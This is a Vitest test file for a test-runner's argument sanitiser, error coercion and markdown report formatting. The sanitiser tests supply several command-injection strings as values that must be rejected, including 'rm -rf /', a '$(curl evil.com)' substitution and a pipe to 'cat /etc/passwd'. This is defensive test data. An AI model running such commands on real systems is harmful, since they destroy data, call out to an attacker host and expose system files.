import { describe, expect, it } from "vitest";
import { coerceErrors, formatReportMarkdown, sanitizeTestArgs } from "./run-tests.js";

describe("sanitizeTestArgs", () => {
	it("allows file paths", () => {
		expect(sanitizeTestArgs(["src/index.test.ts"])).toEqual(["src/index.test.ts"]);
	});

	it("allows --project flag", () => {
		expect(sanitizeTestArgs(["--project", "core"])).toEqual(["--project", "core"]);
	});

	it("rejects command injection via semicolons", () => {
		expect(() => sanitizeTestArgs(["src/test.ts; rm -rf /"])).toThrow();
	});

	it("rejects command injection via backticks", () => {
		expect(() => sanitizeTestArgs(["`whoami`"])).toThrow();
	});

	it("rejects command injection via $() substitution", () => {
		expect(() => sanitizeTestArgs(["$(curl evil.com)"])).toThrow();
	});

	it("rejects pipe characters", () => {
		expect(() => sanitizeTestArgs(["test.ts | cat /etc/passwd"])).toThrow();
	});

	it("allows relative paths with slashes and dots", () => {
		expect(sanitizeTestArgs(["./package/src/utils/ansi.test.ts"])).toEqual(["./package/src/utils/ansi.test.ts"]);
	});
});

describe("coerceErrors", () => {
	it("extracts message from Error-like objects", () => {
		const result = coerceErrors([new Error("boom")]);
		expect(result).toHaveLength(1);
		expect(result[0].message).toBe("boom");
	});

	it("uses stacks array when present", () => {
		const result = coerceErrors([{ message: "fail", stacks: ["frame1", "frame2"] }]);
		expect(result[0].stacks).toEqual(["frame1", "frame2"]);
	});

	it("wraps stack string into stacks array", () => {
		const result = coerceErrors([{ message: "fail", stack: "at foo:1:1" }]);
		expect(result[0].stacks).toEqual(["at foo:1:1"]);
	});

	it("prefers stacks over stack when both are present", () => {
		const result = coerceErrors([{ message: "fail", stacks: ["frame1"], stack: "ignored" }]);
		expect(result[0].stacks).toEqual(["frame1"]);
	});

	it("converts non-object values to string messages", () => {
		const result = coerceErrors(["string error", 42, null]);
		expect(result[0].message).toBe("string error");
		expect(result[1].message).toBe("42");
		expect(result[2].message).toBe("null");
	});

	it("returns empty array for empty input", () => {
		expect(coerceErrors([])).toEqual([]);
	});
});

describe("formatReportMarkdown", () => {
	it("formats a passing report", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "passed" as const,
			summary: { total: 3, passed: 3, failed: 0, skipped: 0, duration: 150 },
			failed: [],
			unhandledErrors: [],
			failedFiles: [],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("3 passed");
		expect(md).toContain("150ms");
		expect(md).not.toContain("failed");
	});

	it("formats a failing report with errors", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "failed" as const,
			summary: { total: 2, passed: 1, failed: 1, skipped: 0, duration: 200 },
			failed: [
				{
					file: "src/math.test.ts",
					state: "failed" as const,
					duration: 50,
					tests: [
						{
							name: "adds numbers",
							fullName: "Math > adds numbers",
							state: "failed" as const,
							duration: 10,
							errors: [{ message: "expected 3 to equal 4", diff: "- 3\n+ 4" }],
						},
					],
				},
			],
			unhandledErrors: [],
			failedFiles: ["src/math.test.ts"],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("1 failed");
		expect(md).toContain("1 passed");
		expect(md).toContain("src/math.test.ts");
		expect(md).toContain("Math > adds numbers");
		expect(md).toContain("expected 3 to equal 4");
		expect(md).toContain("diff");
	});

	it("includes project name when present", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			project: "my-lib",
			reason: "passed" as const,
			summary: { total: 1, passed: 1, failed: 0, skipped: 0, duration: 10 },
			failed: [],
			unhandledErrors: [],
			failedFiles: [],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("Project: my-lib");
	});

	it("formats unhandled errors", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "failed" as const,
			summary: { total: 0, passed: 0, failed: 0, skipped: 0, duration: 0 },
			failed: [],
			unhandledErrors: [{ message: "global crash", stack: "at top-level" }],
			failedFiles: [],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("Unhandled Errors");
		expect(md).toContain("global crash");
		expect(md).toContain("at top-level");
	});

	it("shows skipped count when present", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "passed" as const,
			summary: { total: 5, passed: 3, failed: 0, skipped: 2, duration: 100 },
			failed: [],
			unhandledErrors: [],
			failedFiles: [],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("2 skipped");
	});
});
